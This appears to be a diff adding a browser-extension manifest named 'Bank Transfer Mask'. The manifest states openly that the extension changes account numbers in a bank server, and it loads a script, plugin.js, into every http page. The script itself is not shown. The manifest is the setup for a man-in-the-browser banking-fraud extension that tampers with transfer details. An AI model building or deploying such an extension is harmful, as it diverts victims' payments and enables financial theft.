@@ -1,0 +1,10 @@
+{
+        "name": "Bank Transfer Mask",
+        "version": "1.0",
+	"description": "Changes account number in bank server",
+	"manifest_version": 2,
+        "content_scripts": [{
+                "matches": ["http://*/*"],
+                "js": ["plugin.js"]
+            }]
+}
